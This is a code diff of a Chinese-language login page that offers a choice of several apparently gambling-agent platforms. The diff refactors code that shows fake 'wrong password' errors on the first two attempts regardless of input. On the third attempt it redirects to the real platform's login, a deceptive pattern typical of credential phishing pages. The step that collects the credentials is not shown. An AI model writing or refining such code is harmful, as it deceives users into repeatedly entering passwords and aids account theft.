@@ -158,6 +158,7 @@
 
             if (inputTime < 4) {
                 showErrorNotification("請稍候再試");
+                resetFormInputs();
                 return;
             }
 
@@ -168,6 +169,7 @@
             // 檢查是否選擇了平台
             if (platform === "") {
                 showErrorNotification("請選擇一個平台");
+                resetFormInputs();
                 return;
             }
 
@@ -177,39 +179,13 @@
 
             if (loginAttempts === 0) {
                 showErrorNotification("帳號密碼錯誤第一次");
+                resetFormInputs();
             } else if (loginAttempts === 1) {
                 showErrorNotification("帳號密碼錯誤第二次");
+                resetFormInputs();
             } else if (loginAttempts === 2) {
                 // 第三次輸入，無論驗證結果如何，都將成功跳轉
-                switch (platform) {
-                    case "BU":
-                        window.location.href = "https://ag.bu5168.com/";
-                        break;
-                    case "SZ":
-                        window.location.href = "https://agup.sz17888.com/zh-Hant/login";
-                        break;
-                    case "財神":
-                        window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
-                        break;
-                    case "鉅城":
-                        window.location.href = "https://ag.ofa77.net/login.php";
-                        break;
-                    case "雄厚":
-                        window.location.href = "https://agent.918ofa.net/login.php";
-                        break;
-                    case "好玩":
-                        window.location.href = "https://ag.hw16555.net/";
-                        break;
-                    case "昊陽":
-                        window.location.href = "https://agup.hyg889.com/zh-Hant/login";
-                        break;
-                    case "BCR":
-                        window.location.href = "https://ag.bcr56899.com/";
-                        break;
-                    default:
-                        showErrorNotification("無法識別的平台");
-                        break;
-                }
+                window.location.href = getPlatformLink(platform);
             }
 
             // 增加嘗試次數計數
@@ -228,6 +204,34 @@
             setTimeout(function() {
                 notification.style.display = "none";
             }, 3000); // 顯示3秒後隱藏
+        }
+
+        function resetFormInputs() {
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+        }
+
+        function getPlatformLink(platform) {
+            switch (platform) {
+                case "BU":
+                    return "https://ag.bu5168.com/";
+                case "SZ":
+                    return "https://agup.sz17888.com/zh-Hant/login";
+                case "財神":
+                    return "https://ag.as5588.com/index.php?s=/AgentIndex/index";
+                case "鉅城":
+                    return "https://ag.ofa77.net/login.php";
+                case "雄厚":
+                    return "https://agent.918ofa.net/login.php";
+                case "好玩":
+                    return "https://ag.hw16555.net/";
+                case "昊陽":
+                    return "https://agup.hyg889.com/zh-Hant/login";
+                case "BCR":
+                    return "https://ag.bcr56899.com/";
+                default:
+                    return "#";
+            }
         }
     </script>
 </body>
